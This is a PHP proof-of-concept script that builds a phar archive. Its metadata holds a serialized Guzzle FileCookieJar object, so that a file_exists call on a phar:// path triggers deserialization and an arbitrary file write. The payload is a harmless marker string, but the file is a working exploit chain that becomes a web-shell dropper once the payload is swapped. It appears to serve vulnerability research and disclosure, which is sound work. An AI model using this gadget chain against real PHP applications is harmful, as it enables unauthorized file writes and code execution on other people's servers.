<?php

if(ini_get('phar.readonly') != 0) {
	die("Launch the script with the option -dphar.readonly=0.\n ie: php -dphar.readonly=0 createphar.php\n");
}

$poc = 'poc.phar';

require __DIR__.'/vendor/autoload.php';

use GuzzleHttp\Cookie\FileCookieJar;
use GuzzleHttp\Cookie\SetCookie;

@unlink($poc);

$obj = new FileCookieJar('/tmp/proof.txt');

$payload = 'If you see this, phar injection is working';

$obj->setCookie(new SetCookie([
	'Name' => 'foo', 'Value' => 'bar',
	'Domain' => $payload,
	'Expires' => time()
]));

// create new Phar
$phar = new Phar($poc);
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ? >');


$phar->setMetadata($obj);
$phar->stopBuffering();

echo 'file writed in ' . $poc . "\n";

// use this to execute poc
// file_exists('phar:///./test.phar');

